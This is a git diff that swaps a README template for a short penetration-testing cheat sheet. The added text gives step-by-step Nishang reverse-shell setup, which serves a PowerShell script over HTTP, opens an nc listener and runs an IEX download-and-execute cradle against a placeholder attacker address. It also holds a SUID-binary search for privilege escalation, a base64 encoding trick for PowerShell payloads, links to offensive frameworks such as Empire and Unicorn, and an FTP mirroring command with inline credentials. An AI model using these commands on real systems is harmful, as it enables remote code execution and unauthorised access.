@@ -1,88 +1,43 @@
-# Project Title
+# Tools & Techniques
 
-One Paragraph of project description goes here
 
-## Getting Started
+## Nishang
+To get a sheel from an entry point where cmd is working or the entry point is a cmd
 
-These instructions will get you a copy of the project up and running on your local machine for development and testing purposes. See deployment for notes on how to deploy the project on a live system.
+cp /opt/nishang/Shells/Invoke-PowershellTcp.ps1 nishang.ps1
+gedit nishang.ps1
+Invoke-PowershellTcp -Reverse -IpAdress *.*.*.* -Port *
+python -m SimpleHTTPServer
+nc -lvnp *
 
-### Prerequisites
+In cmd:
+powershell "IEX(New-Object Net.WebClient).downloadString('http://*.*.*.*:*/nishang.ps1')"
 
-What things you need to install the software and how to install them
 
-```
-Give examples
-```
+## Linux
 
-### Installing
+# to list suid binary file:
+find / -perm -u=s -type f 2>/dev/null -exec ls -l {} \;
 
-A step by step series of examples that tell you how to get a development env running
+## Windows
 
-Say what the step will be
+# to convert in base64 with UTF-16LE encoding
+echo -n "Hello World" | iconv --to-code UTF-16LE | base64 -w 0
 
-```
-Give the example
-```
+## Tools
 
-And repeat
+# Shell and Crack
+Unicorn.py :  https://github.com/trustedsec/unicorn  
+Empire.py  :  https://github.com/EmpireProject/Empire
+JAWS       :  https://github.com/411Hall/JAWS   (Windows Enumeration Tools)
+zip2john   :  https://github.com/piyushcse29/john-the-ripper/blob/master/src/zip2john.c (To crack zipped password)
 
-```
-until finished
-```
+# Steganography tools
+zsteg,steghide,binwalk.strings,file,foremost
 
-End with an example of getting some data out of the system or using it for a little demo
+# Other tools
+readpst,mdb-shell,mdb-sql
+## Techniques
 
-## Running the tests
-
-Explain how to run the automated tests for this system
-
-### Break down into end to end tests
-
-Explain what these tests test and why
-
-```
-Give an example
-```
-
-### And coding style tests
-
-Explain what these tests test and why
-
-```
-Give an example
-```
-
-## Deployment
-
-Add additional notes about how to deploy this on a live system
-
-## Built With
-
-* [Dropwizard](http://www.dropwizard.io/1.0.2/docs/) - The web framework used
-* [Maven](https://maven.apache.org/) - Dependency Management
-* [ROME](https://rometools.github.io/rome/) - Used to generate RSS Feeds
-
-## Contributing
-
-Please read [CONTRIBUTING.md](https://gist.github.com/PurpleBooth/b24679402957c63ec426) for details on our code of conduct, and the process for submitting pull requests to us.
-
-## Versioning
-
-We use [SemVer](http://semver.org/) for versioning. For the versions available, see the [tags on this repository](https://github.com/your/project/tags). 
-
-## Authors
-
-* **Billie Thompson** - *Initial work* - [PurpleBooth](https://github.com/PurpleBooth)
-
-See also the list of [contributors](https://github.com/your/project/contributors) who participated in this project.
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details
-
-## Acknowledgments
-
-* Hat tip to anyone whose code was used
-* Inspiration
-* etc
-
+To download all files from ftp server:
+wget -m --no-passive ftp://username:password@x.x.x.x
